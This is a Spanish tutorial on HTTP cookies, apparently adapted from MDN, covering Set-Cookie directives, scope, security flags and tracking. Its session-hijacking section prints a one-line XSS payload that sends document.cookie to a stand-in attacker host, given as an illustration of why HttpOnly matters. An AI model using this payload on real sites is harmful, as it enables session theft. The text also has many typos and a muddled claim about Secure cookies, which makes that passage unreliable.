# **HTTP COOKIE**

Una **http cookie** (ya sea referido a web cookie, cookie en navegado,etc.) es una pequeño fragmento de datos que un servidor envía al navegador web de cualquier usuario, que puede almacenarlo y devolverlo con la siguiente solicitud al mismo servidor.
El uso de cookies en programacion tiene como objetivo saber si, dos solicitudes procedían del mismo ordenador.

 Las cookies se utiliza principalmente para tres propositos:

 - Gestion de sesesione( inicios de sesion de usuarios, carritos de compras).
 - Personalización (preferencias del usuario).
 - Seguimiento (análisis del comportamiento del usuario).

Las cookies también se han utilizado para el almacenamiento general del lado del cliente. Anteriormente era la única forma para el almacenamiento del lado del cliente, ya no es el caso hoy en día, donde los navegadores web son capaces de utilizar varias API de almacenamiento. Dado que las cookies se envían junto con cada solicitud, puede ser una carga de rendimiento adicional (especialmente para la web móvil). Las API nuevas a considerar para el almacenamiento local son la API de almacenamiento Web (localStorage y sessionStorage) y IndexedDB.


## Ceacion de cookies.

Al recibir una petición  HTTP se puedeenviar un encabezado cookie con la respuesta. La cookie normamente e almacenaen el navegador y, posteriormente, se envía el valor juntocon cadasolicitud hechaal mismo servidoque el contenido del encabezado de la Cookie.

#### Las Set-Cookie y las Cookie headers.

Las Set-Cookie HTTP son usadas para enviar cookies desde el servidor a el agente de usuario.

Una forma sencilla de configurar una cookie puede ser de la siguiente manera:

`
Set-Cookie: <cookie-name>=<cookie-value>
`

Aquí, el servidor le dice al cliente que almacene una cookie (por ejemplo, aplicaciones como PHP, Node.js, Python o Ruby on Rails).
La respuesta enviada al navegador contendrá el encabezado Set-Cookie y el navegador almacena la cookie.


#### Session cookies

La cookie creada anteriormente es una session cookie: se elminará cuando el cliente se cierre. No especifican caducidad máxima.
Algunos navegadores web tiene habilitada la restauración de sesiones, lo que provoca que estas cookies temporales sean permanentes, como si el navegador nunca se cerrase.

#### Permanent cookies

Estas cookies no expiran cuando el navegador cieere , sino  que tienen una fecha especificada.

`
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
`

#### Secure and HttpOnly cookies

Una secure cookies sólo se enviará al servidor cuando se realice una solicitud usando SSL y el protocilo HTTP.
Sin embargo, tengan en cuenta que la información privada nunca debe enviarse en cookies HTTP ya que todo el protocolo es inseguro y este no le ofrecerá ningún  cifrado o seguridad adicional.

Para evitar ataques de secuencias de comandos entre sitios, las cookies sólo de HTTP no son accesibles a través de javascript a través de la propiedad Document.cookie, las API XMLHttpRequest y Request.


`
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
`

#### Ámbito de cookies


Las directivas de dominio y ruta definen el ámbito de la cookie, es decir, el conjunto de URL a las que se deben enviar las cookies.

El dominio especifica los hosts a los que se enviará la cookie. Si no se especifica, el valor predeterminado es la parte del host de la ubicación del documento actual (pero sin incluir subdominios). Si se especifica un dominio, los subdominios siempre se incluyen.

Si se establece Domain = mozilla.org, las cookies se incluyen en subdominios como developer.mozilla.org.

Path indica una ruta de acceso de URL que debe existir en el recurso solicitado antes de enviar el encabezado de Cookie. El carácter% x2F ("/") se interpreta como un separador de directorios y los subdirectorios se emparejarán también.

Si se establece Path = / docs, todos estos caminos coincidirán:


- "/docs",
- "/docs/Web/",
- "docs/Web/HTTP"

#### Accediendo desde JavaScript usando Document.cookies


````.js
document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=strawberry";
console.log(document.cookie);
// logs "yummy_cookie=choco; tasty_cookie=strawberry"
````


### Seguridad

#### Session hijacking y XSS

Las cookies se utilizan a menudo en la aplicación web ara identificar a un usuario y su sesión autenticada. Robar una cookie puede llevar a robar la sesion de algún usuario autenticado.

`
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
`



### Tracking y privacidad

#### Third-party cookies


Las cookies tienen un dominio asociado a ellas. Si este dominio es el mismo que el dominio de la página en la que se encuentra, se dice que las cookies son una cookie de primera persona. Si el dominio es diferente, se dice que es una cookie de terceros. Si bien las cookies de primera persona se envían únicamente al servidor que las configura, una página web puede contener imágenes u otros componentes almacenados en servidores de otros dominios (como los banners publicitarios). Las cookies que se envían a través de estos componentes de terceros se denominan cookies de terceros y se utilizan principalmente para publicidad y seguimiento en toda la Web.
 La mayoría de los navegadores permiten cookies de terceros por defecto, pero hay complementos disponibles para bloquearlos (por ejemplo, Badger de privacidad por el EFF).

Si no está revelando cookies de terceros, la confianza del consumidor podría resultar perjudicada si se descubre el uso de cookies. Una divulgación clara (como en una política de privacidad) tiende a eliminar cualquier efecto negativo de un descubrimiento de una cookie.

#### Do-Not-Track

No hay requisitos legales o tecnológicos para su uso, pero el encabezado DNT se puede utilizar para señalar que una aplicación web debe desactivar su seguimiento o el seguimiento de usuarios de varios sitios de un usuario individual. Consulte el encabezado DNT para obtener más información.


#### Zombie cookies y Evercookies


Un acercamiento más radical a las cookies es las cookies zombies o "Evercookies" que se recrean después de su eliminación y son intencionalmente difíciles de eliminar para siempre. Están utilizando la API de almacenamiento Web, los objetos compartidos locales de Flash y otras técnicas para recrearse cada vez que se detecta la ausencia de la cookie.


## Set-Cookie

#### Sintaxis

````.js
Set-Cookie: <cookie-name>=<cookie-value>
Set-Cookie: <cookie-name>=<cookie-value>; Expires=<date>
Set-Cookie: <cookie-name>=<cookie-value>; Max-Age=<non-zero-digit>
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>
Set-Cookie: <cookie-name>=<cookie-value>; Path=<path-value>
Set-Cookie: <cookie-name>=<cookie-value>; Secure
Set-Cookie: <cookie-name>=<cookie-value>; HttpOnly

Set-Cookie: <cookie-name>=<cookie-value>; SameSite=Strict
Set-Cookie: <cookie-name>=<cookie-value>; SameSite=Lax

// Multiple directives are also possible, for example:
Set-Cookie: <cookie-name>=<cookie-value>; Domain=<domain-value>; Secure; HttpOnly
````

#### Directivas

```.js
<cookie-name>=<cookie-value>
```
- Una cookie empieza siempre con un par clave-valor
  - El cookie-name puede llevar cualquier cosa excepto carácteres de control..
  - El cookie valor puede llevar de manera opcional dobles comillas y cualquier carácter excluyendo caracteres de control, espacios,comillas dobles, coma, punto, punto y coma y barra invertida.

  - Prefijo seguro: las cookies con un nombre que empiece por ``__Secure-`` deben establecerse con el indicador seguro y deben ser de una página segura.

  - Prefijo Host: las cookies con un nombre que empiece por  ``__Host-`` deben establecerse con el indicador seguro, deben ser de página segura (HTTPS), no deben tener un dominio específico y por lo tanto la ruta es "/".

- ``Expires=<date>`` y ``max-age=<segundos>`` opcional
  - Indica el máximo tiempo de vida de la cookie. Si no se especifica ninguno de los dos, se establece el tiempo de la cookie con la sesión actua, lo que se conoce anteriormente como sesión cookie.

- ``path=<ruta>`` opcional
  - Establece la ruta para la cuál la cookie es válida. Algo así como los "directorios" o "secciones" de la web. Por defecto, si no se especifica ningún valor, una cookie sólo es válida para el path actual.

- ``domain=<dominio>`` opcional
  -  Por defecto, las cookies son válidas sólo para el subdominio actual en el que se crea la cookie. Esto quiere decir que si el atributo domain está vacío y estamos en ejemplo.com, la cookie es válida sólo para ejemplo.com, si estamos en www.ejemplo.com, la cookie será válida sólo para www.ejemplo.com, si estamos en sub.ejemplo.com, la cookie es válida sólo para sub.ejemplo.com, o sí estamos en foo.sub.ejemplo.com, la cookie es válida sólo para foo.sub.ejemplo.com. Pero si el atributo domain no está vació, podemos especificar otros subdominios para los que la cookie es válida. Por ejemplo, domain=sub.ejemplo.com creará una cookie válida sólo para sub.dominio.com; si estamos en otro subdominio, por ejemplo foo.ejemplo.com, e intentamos leer esa cookie, no podremos, ya que sólo era válida para sub.ejemplo.com.


- ``secure`` opcional
  - Este parámetro no tiene ningún valor. Si está presente la cookie sólo es válida para conexiones encriptadas (por ejemplo mediante protocolo HTTPS).

- ``HttpOnly`` opcional
  - Este parámetro no tiene ningún valor. Si está presente, la cookie solo es accesible mediante protocolo HTTP (o HTTPS). Estas cookies no pueden ser leídas ni creadas mediante otros protocolos y APIs, por ejemplo, JavaScript.
